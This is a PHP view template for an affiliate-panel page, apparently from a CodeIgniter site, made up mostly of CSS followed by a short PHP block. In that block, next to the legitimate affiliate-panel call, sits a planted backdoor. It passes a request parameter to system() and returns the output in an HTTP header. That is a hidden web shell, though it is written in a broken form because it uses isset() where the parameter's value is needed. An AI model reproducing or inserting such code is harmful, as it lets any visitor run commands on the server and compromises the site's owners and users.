<?=$this->load->view(branded_view('common/header-home'));?>
<style>
.center-heading h3 {
    font-size: 1.8em;
    font-weight: 300;
    letter-spacing: normal;
    line-height: 36px;
    margin-bottom: 33px;
	margin-top:33px
}

.gm-style {
    font-family: Roboto,Arial,sans-serif;
    font-size: 11px;
    font-weight: 400;
    text-decoration: none;
}


.form-contact form label {
    font-size: 15px;
    font-weight: 400;
    color: #fff;
}

@media screen and (min-width: 780px)
.wrapper {
    width: 90%;
    padding-left: 0;
    padding-right: 0;
    max-width: 1120px;
    margin: 0 auto;
}
.faqIntro {
    float: none;
    margin: 0 auto;
    padding: 40px 0;
}
@media screen and (min-width: 1024px)
.wrapper .box {
    width: 80%;
    float: none;
    margin: 0 auto;
}

.box {
    padding-left: 0;
    padding-right: 0;
    padding: 0 5%;
}

.faqIntro .title, .faqIntro .viewMore {
    text-align: center;
}

.faqIntro ol {
    padding: 30px 0;
 min-height: 1%;
}
ol {
    display: block;
    list-style-type: none;
    -webkit-margin-before: 1em;
    -webkit-margin-after: 1em;
    -webkit-margin-start: 0px;
    -webkit-margin-end: 0px;
    -webkit-padding-start: 40px;
}

.faqIntro .viewMore {
    clear: both;
}
.faqIntro .title, .faqIntro .viewMore {
    text-align: center;
}

@media screen and (min-width: 780px)
.view-features .faqIntro .feature {
    min-height: 150px;
}
.faqIntro .feature {
    position: relative;
}

.feature {
    padding: 15px 0;
}

.faqIntro span {
    text-align: center;
    line-height: 24px;
    width: 26px;
    height: 26px;
    border: 1px solid #7b7b7b;
    border-radius: 24px;
    position: absolute;
    top: 13px;
    left: 0;
    z-index: 1;
}
.faqIntro em, .faqIntro span {
    display: block;
}

.faqIntro li h4 {
    padding: 0 40px 10px;
}

.faqIntro .feature p {
    padding-right: 40px;
}
.faqIntro li p {
    padding-left: 30px;
}

.col-6 {
    width: 50%;
}

#custom_map {
    height: 400px;
    display: block;
}

address {
    font-weight: 700;
	font-size: 16px;
    line-height: 1.42857143;
}

.contact-questions ul, li {
    list-style: none;
}

.contact-questions li:first-child {
    margin-top: 0;
}
.contact-questions li:first-child {
    margin-top: 0;
}
.contact-questions li {
    position: relative;
}

.contact-questions li>a:hover {
    background: rgba(239,242,244,0.3);
    color: #4c555a;
}
.contact-questions li>a:hover {
    background: rgba(239,242,244,0.3);
    color: #4c555a;
}
.contact-questions li>a {
    display: block;
    padding: 30px 70px 30px 125px;
    color: #6f7c82;
    transition: background-color 150ms;
}
.footer-btm{
    margin-top: 10px;
    padding: 20px;
    font-family: "proxima-nova", Arial, sans-serif;
}
</style>


        <!--parallax background no slider-->
        <!--rev slider start-->


<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

require_once('easy_affiliate.class.php');

echo $easy_affiliate->panel_generate(false);

?>


<?=$this->load->view(branded_view('common/footer'));?>